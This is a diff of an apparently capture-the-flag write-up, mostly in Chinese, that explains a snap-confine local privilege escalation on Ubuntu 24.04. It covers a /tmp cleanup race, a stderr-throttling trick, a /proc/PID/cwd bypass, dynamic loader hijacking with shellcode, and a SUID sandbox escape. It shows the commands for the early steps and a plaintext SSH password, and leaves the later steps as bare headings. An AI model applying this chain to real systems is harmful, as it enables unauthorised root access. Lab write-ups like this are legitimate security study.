@@ -331,6 +331,13 @@ snapd   2.63.1+24.04
 series  16
 ubuntu  24.04
 kernel  6.17.0-19-generic
+
+jonathan@snapped:~/snap$ ls -la
+total 12
+drwx------  3 jonathan jonathan 4096 Mar 20 11:38 .
+drwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
+drwxr-xr-x  4 jonathan jonathan 4096 Mar 20 11:38 snapd-desktop-integration
+
 ```
 #### 我们在谷歌上搜索了有关最新 snapd 漏洞的信息，发现 Quayls 发布了这样的声明：所有版本（包括 2.74.2 之前的所有版本）都存在针对默认 Ubuntu 图形用户界面安装的攻击漏洞。目标所使用的 Ubuntu 24.04 系统中，snap-confine 是一个 SUID-root 二进制文件，它会在任何 snap 运行之前构建沙盒环境。而在 Ubuntu 25.10 及更高版本中，snap-confine 则具有相应的权限。这种设置的一部分内容包括创建模拟文件，即可写入的只读文件系统目录的副本。对于 /usr/lib/x86_64-linux-gnu 目录的模拟序列是：
 ```
@@ -365,19 +372,95 @@ D /tmp 1777 root root 4m
 #### 这意味着，位于 /tmp 目录下任何超过 4 分钟未更新的文件都将被删除，这为利用此漏洞创造了绝佳条件。
 ```
 1.The Precondition: systemd-tmpfiles //前置条件
-位于 /tmp 下的“.snap”目录是由“snap-confine”在每次调用时进行维护的。Ubuntu 24.04将“systemd-tmpfiles-clean.timer”定时器的配置修改为：删除位于“/tmp”目录下超过 30 天的文件（在“tmp.conf”文件中为“D /tmp 1777 root root 30d”）。当“.snap”文件进入休眠状态并被清理后，攻击者会重新创建它，由于“/tmp”是可被所有人读写的，所以重新创建的目录将属于攻击者所有。
+位于 /tmp 下的“.snap”目录是由“snap-confine”在每次调用时进行维护的。
+Ubuntu 24.04将“systemd-tmpfiles-clean.timer”定时器的配置修改为：
+删除位于“/tmp”目录下超过 30 天的文件（在“tmp.conf”文件中为“D /tmp 1777 root root 30d”）。
+当“.snap”文件进入休眠状态并被清理后，攻击者会重新创建它，由于“/tmp”是可被所有人读写的，所以重新创建的目录将属于攻击者所有。
 
-Winning the Race Reliably //可靠的
-该辅助程序将 snap-confine 的标准错误输出重定向到一个 AF_UNIX 套接字，其设置为 SO_RCVBUF=1 和 SO_SNDBUF=1 。这造成了极大的阻塞压力，因为 snap-confine 在每次对标准错误的写入操作中都会阻塞，直到辅助程序读取一个字节。辅助程序逐字节读取，实际上是在单步执行 snap-confine 的执行过程。当检测到触发消息 dir：“/tmp/.snap/usr/lib/x86_64-linux-gnu”（在模拟步骤 1 后发出）时（模拟步骤 1 后发出），snap-confine 在写入过程中被阻塞。攻击者有无限的时间通过 renameat2(RENAME_EXCHANGE) 来执行交换操作。
+2.Winning the Race Reliably //可靠的
+该辅助程序将 snap-confine 的标准错误输出重定向到一个 AF_UNIX 套接字，其设置为 SO_RCVBUF=1 和 SO_SNDBUF=1 。
+这造成了极大的阻塞压力，因为 snap-confine 在每次对标准错误的写入操作中都会阻塞，直到辅助程序读取一个字节。
+辅助程序逐字节读取，实际上是在单步执行 snap-confine 的执行过程。
+当检测到触发消息 dir：“/tmp/.snap/usr/lib/x86_64-linux-gnu”（在模拟步骤 1 后发出）时（模拟步骤 1 后发出），
+snap-confine 在写入过程中被阻塞。攻击者有无限的时间通过 renameat2(RENAME_EXCHANGE) 来执行交换操作。
 
 3./proc/PID/cwd Bypass
-/tmp/snap-private-tmp 的权限设置为 700（即根用户对根用户），因此非特权用户无法访问该目录。然而，访问 /proc/PID/cwd 则会通过进程的挂载命名空间来遵循其工作目录，从而完全绕过了主机权限检查。
+/tmp/snap-private-tmp 的权限设置为 700（即根用户对根用户），因此非特权用户无法访问该目录。
+然而，访问 /proc/PID/cwd 则会通过进程的挂载命名空间来遵循其工作目录，从而完全绕过了主机权限检查。
 
 4.Dynamic Loader Hijack //动态加载程序劫持
-比较结束后，该命名空间内位于 /usr/lib/x86_64-linux-gnu 下的所有库都成为了攻击者所掌控的资源。用 shellcode 替换 ld-linux-x86-64.so.2 将意味着在这个命名空间中执行的任何 SUID 二进制文件都会以 root 身份触发该 shellcode，因为内核会在程序本身之前加载 PT_INTERP 中指定的动态链接器，而 SUID 二进制文件的有效权限则会随之生效。
+比较结束后，该命名空间内位于 /usr/lib/x86_64-linux-gnu 下的所有库都成为了攻击者所掌控的资源。
+用 shellcode 替换 ld-linux-x86-64.so.2 将意味着在这个命名空间中执行的任何 SUID 二进制文件都会以 root 身份触发该 shellcode，
+因为内核会在程序本身之前加载 PT_INTERP 中指定的动态链接器，而 SUID 二进制文件的有效权限则会随之生效。
 
 5.Sandbox Escape //“沙盒逃脱”
-火狐软件包的 AppArmor 配置文件允许对 /var/snap/firefox/common/ 目录进行写入操作。一个设置为 SUID 的 bash 脚本会存放在此处，且不受 AppArmor 的限制，能够脱离沙盒环境持续运行。
+火狐软件包的 AppArmor 配置文件允许对 /var/snap/firefox/common/ 目录进行写入操作。
+一个设置为 SUID 的 bash 脚本会存放在此处，且不受 AppArmor 的限制，能够脱离沙盒环境持续运行。
 ```
 ### Exploitation
-Step 1 — Enter sandbox (Terminal 1)
+
+
+#### 进入 Firefox 的 snap 安全沙箱界面，并记录下进程 ID。此进程会保持沙箱的挂载命名空间处于活动状态，其 /tmp 目录由主机上的 /tmp/snap-private-tmp/snap.firefox/tmp 进行备份。
+----------------------------------------------------------------------
+(Terminal 1)
+----------------------------------------------------------------------
+#### Step 1 — Enter sandbox
+<details>
+<summary>jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash</summary>
+
+```
+jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/local/share/doc /usr/local/share/doc none bind,ro 0 0): cannot open directory "/usr/local/share": permission denied
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gimp/2.0/help /usr/share/gimp/2.0/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gimp/2.0/help" because it would affect the host in "/var/lib/snapd"
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/gtk-doc /usr/share/gtk-doc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/gtk-doc" because it would affect the host in "/var/lib/snapd"
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/javascript/jquery /usr/share/javascript/jquery none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/javascript/jquery" because it would affect the host in "/var/lib/snapd"
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/javascript/sphinxdoc /usr/share/javascript/sphinxdoc none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/javascript/sphinxdoc" because it would affect the host in "/var/lib/snapd"
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/libreoffice/help /usr/share/libreoffice/help none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/libreoffice/help" because it would affect the host in "/var/lib/snapd"
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme /usr/share/sphinx_rtd_theme none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/sphinx_rtd_theme" because it would affect the host in "/var/lib/snapd"
+update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/xubuntu-docs /usr/share/xubuntu-docs none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/xubuntu-docs" because it would affect the host in "/var/lib/snapd"
+bash: /home/jonathan/.bashrc: Permission denied
+jonathan@snapped:/home/jonathan$ snap --servion
+bash: /usr/bin/snap: Permission denied
+```
+</details>
+
+#### Step 2 — Wait for .snap deletion 
+```
+jonathan@snapped:/home/jonathan$ cd /tmp       
+jonathan@snapped:/tmp$ echo $$
+2850
+jonathan@snapped:/tmp$ 
+jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done
+
+jonathan@snapped:/tmp$ stat ./.snap
+stat: cannot statx './.snap': No such file or directory
+```
+----------------------------------------------------------------------
+(Terminal 2)
+----------------------------------------------------------------------
+#### Step 3 — Access sandbox /tmp from outside
+```
+[★]$ ssh jonathan@snapped.htb
+jonathan@snapped.htb's password: linkinpark
+
+jonathan@snapped:/tmp$ cd /proc/2850/cwd
+jonathan@snapped:/proc/2850/cwd$ ls -la
+total 4
+drwxrwxrwt  2 root root 4096 Apr  8 09:09 .
+drwxr-xr-x 21 root root  540 Apr  8 09:05 ..
+```
+#### Step 4 — Destroy cached namespace 
+#### Step 5 — Win the race 
+----------------------------------------------------------------------
+Terminal 3
+----------------------------------------------------------------------
+#### Step 6 — Overwrite dynamic loader
+#### Step 7 — Trigger root 
+----------------------------------------------------------------------
+Busybox shell
+----------------------------------------------------------------------
+#### Step 8 — Escape sandbox
+----------------------------------------------------------------------
+Terminal 3
+----------------------------------------------------------------------
+#### Step 9 — Full root
